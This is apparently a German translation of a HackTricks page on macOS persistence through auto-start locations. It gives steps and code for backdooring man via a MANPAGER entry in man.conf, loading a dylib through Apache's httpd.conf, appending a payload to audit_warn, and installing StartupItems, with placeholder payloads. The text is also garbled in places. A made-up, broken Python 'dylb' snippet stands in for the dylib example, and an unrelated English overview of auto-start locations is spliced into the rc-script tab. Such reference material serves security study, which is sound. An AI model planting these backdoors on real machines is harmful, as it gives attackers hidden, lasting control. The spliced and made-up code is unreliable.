Die Konfigurationsdatei **`/private/etc/man.conf`** gibt an, welche Binärdatei/Skript verwendet werden soll, wenn man Dokumentationsdateien öffnet. Der Pfad zur ausführbaren Datei kann also so geändert werden, dass jedes Mal, wenn der Benutzer man verwendet, eine Hintertür ausgeführt wird.

Beispiel in **`/private/etc/man.conf`** festlegen:
```
MANPAGER /tmp/view
```
Und dann erstellen Sie `/tmp/view` wie folgt:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

* Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
* Aber du musst root sein und Apache muss laufen
* TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)
* Httpd hat keine Berechtigungen

#### Standort

* **`/etc/apache2/httpd.conf`**
* Root erforderlich
* Auslöser: Wenn Apache2 gestartet wird

#### Beschreibung & Exploit

Sie können in `/etc/apache2/httpd.conf` angeben, dass ein Modul geladen wird, indem Sie eine Zeile wie folgt hinzufügen:

{% code overflow="wrap" %}
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
{% endcode %}

Auf diese Weise werden Ihre kompilierten Module von Apache geladen. Das Einzige ist, dass Sie entweder ein gültiges Apple-Zertifikat dafür benötigen oder ein neues vertrauenswürdiges Zertifikat im System hinzufügen und es damit signieren müssen.

Dann, falls erforderlich, können Sie sicherstellen, dass der Server gestartet wird, indem Sie Folgendes ausführen:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Codebeispiel für den Dylb:

```python
import dylb

def main():
    # Code here

if __name__ == "__main__":
    main()
```

Der obige Code zeigt ein einfaches Beispiel für die Verwendung des Dylb-Moduls in Python.
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM-Audit-Framework

Writeup: [https://theevilbit.github.io/beyond/beyond\_0031/](https://theevilbit.github.io/beyond/beyond\_0031/)

* Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
* Aber du musst root sein, auditd muss ausgeführt werden und eine Warnung verursachen
* TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Standort

* **`/etc/security/audit_warn`**
* Root erforderlich
* **Auslöser**: Wenn auditd eine Warnung erkennt

#### Beschreibung & Exploit

Immer wenn auditd eine Warnung erkennt, wird das Skript **`/etc/security/audit_warn`** **ausgeführt**. Du könntest also deine Payload hinzufügen.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Sie könnten eine Warnung erzwingen mit `sudo audit -n`.

### Startobjekte

{% hint style="danger" %}
**Dies ist veraltet, daher sollte in diesen Verzeichnissen nichts gefunden werden.**
{% endhint %}

Das **StartupItem** ist ein Verzeichnis, das entweder in `/Library/StartupItems/` oder `/System/Library/StartupItems/` positioniert sein sollte. Sobald dieses Verzeichnis erstellt ist, muss es zwei spezifische Dateien enthalten:

1. Ein **rc-Skript**: Ein Shell-Skript, das beim Start ausgeführt wird.
2. Eine **plist-Datei**, die speziell `StartupParameters.plist` genannt wird und verschiedene Konfigurationseinstellungen enthält.

Stellen Sie sicher, dass sowohl das rc-Skript als auch die `StartupParameters.plist`-Datei korrekt im **StartupItem**-Verzeichnis platziert sind, damit der Startvorgang sie erkennt und verwendet.


{% tabs %}
{% tab title="StartupParameters.plist" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{% tab title="superservicename" %}

## macOS Auto-Start Locations

In macOS, there are several locations where you can configure applications to automatically start when the system boots up. These auto-start locations can be useful for legitimate purposes, but they can also be exploited by attackers to gain persistence on a compromised system.

Here are some common auto-start locations in macOS:

### 1. LaunchAgents

LaunchAgents are plist files located in the `~/Library/LaunchAgents` directory or `/Library/LaunchAgents` directory. These files contain instructions for launching specific applications or scripts when a user logs in.

To view the LaunchAgents on your system, you can use the following command:

```bash
ls -la ~/Library/LaunchAgents
ls -la /Library/LaunchAgents
```

To disable a LaunchAgent, you can use the following command:

```bash
launchctl unload -w <path_to_plist_file>
```

### 2. LaunchDaemons

LaunchDaemons are plist files located in the `/Library/LaunchDaemons` directory. These files are used to launch system-wide daemons or services during the boot process.

To view the LaunchDaemons on your system, you can use the following command:

```bash
ls -la /Library/LaunchDaemons
```

To disable a LaunchDaemon, you can use the following command:

```bash
launchctl unload -w <path_to_plist_file>
```

### 3. Startup Items

Startup Items are legacy auto-start locations that were used in older versions of macOS. They are located in the `/Library/StartupItems` directory or `/System/Library/StartupItems` directory.

To view the Startup Items on your system, you can use the following command:

```bash
ls -la /Library/StartupItems
ls -la /System/Library/StartupItems
```

To disable a Startup Item, you can remove or rename the corresponding directory.

### 4. Login Items

Login Items are applications or scripts that are configured to launch when a user logs in. They can be managed through the "Users & Groups" settings in the System Preferences.

To view the Login Items on your system, you can go to "System Preferences" > "Users & Groups" > "Login Items".

To disable a Login Item, you can remove it from the list of Login Items.

### 5. Cron Jobs

Cron Jobs are scheduled tasks that can be configured to run at specific times or intervals. They are managed through the `crontab` command.

To view the Cron Jobs on your system, you can use the following command:

```bash
crontab -l
```

To disable a Cron Job, you can remove it from the crontab file using the `crontab -e` command.

### 6. LaunchAgents and LaunchDaemons in Application Bundles

Some applications may include their own LaunchAgents or LaunchDaemons within their application bundles. These files are usually located in the `Contents/Library/LaunchAgents` or `Contents/Library/LaunchDaemons` directories of the application bundle.

To view the LaunchAgents and LaunchDaemons within an application bundle, you can use the following command:

```bash
ls -la /Applications/<application_name>.app/Contents/Library/LaunchAgents
ls -la /Applications/<application_name>.app/Contents/Library/LaunchDaemons
```

To disable a LaunchAgent or LaunchDaemon within an application bundle, you can remove or rename the corresponding file.

### 7. Other Auto-Start Locations

There may be other custom auto-start locations specific to certain applications or configurations. These locations can vary depending on the system setup and installed software.

To identify other auto-start locations, you can search for relevant documentation or consult with the application or system administrator.

It is important to regularly review and monitor the auto-start locations on your macOS system to ensure that only legitimate applications and services are configured to auto-start.
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{% endtab %}
{% endtabs %}

### ~~emond~~

{% hint style="danger" %}
Ich kann diese Komponente in meinem macOS nicht finden. Für weitere Informationen siehe den Writeup.
{% endhint %}

Writeup: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

Von Apple eingeführt, ist **emond** ein Protokollierungsmechanismus, der anscheinend unterentwickelt oder möglicherweise aufgegeben wurde, aber dennoch zugänglich bleibt. Obwohl es für einen Mac-Administrator nicht besonders nützlich ist, könnte dieser obskure Dienst als subtile Persistenzmethode für Bedrohungsakteure dienen, die von den meisten macOS-Administratoren wahrscheinlich unbemerkt bleibt.

Für diejenigen, die von seiner Existenz wissen, ist es einfach, eine bösartige Nutzung von **emond** zu erkennen. Der LaunchDaemon des Systems für diesen Dienst sucht nach Skripten, die in einem einzigen Verzeichnis ausgeführt werden sollen. Um dies zu überprüfen, kann der folgende Befehl verwendet werden:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

#### Standort

* **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
* Root-Berechtigung erforderlich
* **Auslöser**: Mit XQuartz

#### Beschreibung & Exploit

XQuartz ist **nicht mehr in macOS installiert**, daher sollten Sie für weitere Informationen den Writeup überprüfen.

### ~~kext~~

{% hint style="danger" %}
Es ist so kompliziert, kext selbst als Root zu installieren, dass ich dies nicht als Flucht aus Sandboxes oder sogar für Persistenz betrachten werde (es sei denn, Sie haben einen Exploit).
{% endhint %}

#### Standort

Um ein KEXT als Startelement zu installieren, muss es in einem der folgenden Orte installiert sein:

* `/System/Library/Extensions`
* KEXT-Dateien, die in das OS X-Betriebssystem integriert sind.
* `/Library/Extensions`
* KEXT-Dateien, die von Software von Drittanbietern installiert wurden

Sie können die derzeit geladenen kext-Dateien auflisten mit:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Für weitere Informationen über [Kernel-Erweiterungen siehe diesen Abschnitt](macos-security-and-privilege-escalation/mac-os-architecture/#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.github.io/beyond/beyond\_0029/)

#### Standort

* **`/usr/local/bin/amstoold`**
* Root-Berechtigung erforderlich

#### Beschreibung & Ausnutzung

Anscheinend wurde die `plist` von `/System/Library/LaunchAgents/com.apple.amstoold.plist` dieses Binärprogramm verwendet, während ein XPC-Dienst freigelegt wurde... das Problem war jedoch, dass das Binärprogramm nicht existierte. Daher konnte man etwas dort platzieren und wenn der XPC-Dienst aufgerufen wurde, würde Ihr Binärprogramm aufgerufen werden.

Ich kann dies nicht mehr in meinem macOS finden.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.github.io/beyond/beyond\_0015/)

#### Standort

* **`/Library/Preferences/Xsan/.xsanrc`**
* Root-Berechtigung erforderlich
* **Auslöser**: Wenn der Dienst ausgeführt wird (selten)

#### Beschreibung & Ausnutzung

Anscheinend ist es nicht sehr üblich, dieses Skript auszuführen, und ich konnte es nicht einmal in meinem macOS finden. Wenn Sie weitere Informationen wünschen, lesen Sie das Writeup.

### ~~/etc/rc.common~~

{% hint style="danger" %}
**Dies funktioniert nicht in modernen MacOS-Versionen**
{% endhint %}

Es ist auch möglich, hier **Befehle zu platzieren, die beim Start ausgeführt werden sollen.** Beispiel für ein reguläres rc.common-Skript:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Persistenztechniken und Tools

* [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
* [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
